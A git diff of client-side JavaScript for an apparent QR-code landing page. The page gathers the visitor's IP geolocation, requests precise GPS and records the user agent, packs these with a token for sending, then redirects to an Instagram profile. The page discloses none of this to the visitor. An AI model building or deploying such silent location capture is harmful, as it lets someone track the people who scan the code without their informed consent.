@@ -16,56 +16,81 @@ const params = new URLSearchParams(window.location.search);
 const objeto = params.get("objeto") || "QR_Default";
 const ua = navigator.userAgent;
 
-function finalizar(url = "https://google.com") {
+function finalizar(url = "https://instagram.com/lelio.87") {
   window.location.href = url;
 }
 
+// 🔥 Obtener IP
 fetch("https://ipwho.is/")
   .then(r => r.json())
   .then(geo => {
 
+    console.log("IP DATA:", geo);
+
     const base = {
-      ip: geo.ip,
-      ciudad: geo.city,
-      pais: geo.country,
-      lat: geo.latitude,
-      lon: geo.longitude
+      ip: geo.ip || "",
+      ciudad: geo.city || "",
+      pais: geo.country || "",
+      lat: geo.latitude || "",
+      lon: geo.longitude || ""
     };
 
     if ("geolocation" in navigator) {
 
-      const timeout = setTimeout(() => enviar(base, "IP"), 4000);
+      let enviado = false;
+
+      const enviarSeguro = (data, metodo) => {
+        if (enviado) return;
+        enviado = true;
+        enviar(data, metodo);
+      };
+
+      const timeout = setTimeout(() => {
+        enviarSeguro(base, "IP");
+      }, 4000);
 
       navigator.geolocation.getCurrentPosition(
         pos => {
           clearTimeout(timeout);
-          enviar({
+
+          enviarSeguro({
             ...base,
             lat: pos.coords.latitude,
             lon: pos.coords.longitude
           }, "GPS");
         },
-        () => {
+        err => {
           clearTimeout(timeout);
-          enviar(base, "IP");
-        }
+          enviarSeguro(base, "IP");
+        },
+        { timeout: 3500, enableHighAccuracy: true }
       );
 
     } else {
       enviar(base, "IP");
     }
 
+  })
+  .catch(() => {
+    enviar({
+      lat: "",
+      lon: "",
+      ip: "",
+      ciudad: "",
+      pais: ""
+    }, "SinDatos");
   });
 
 function enviar(data, metodo) {
+
   const query = new URLSearchParams({
     token: CONFIG.token,
     objeto: objeto,
-    lat: data.lat,
-    lon: data.lon,
-    ip: data.ip,
-    ciudad: data.ciudad,
-    pais: data.pais,
+    lat: data.lat || "",
+    lon: data.lon || "",
+    ip: data.ip || "",
+    ciudad: data.ciudad || "",
+    pais: data.pais || "",
     metodo: metodo,
     ua: ua
   });
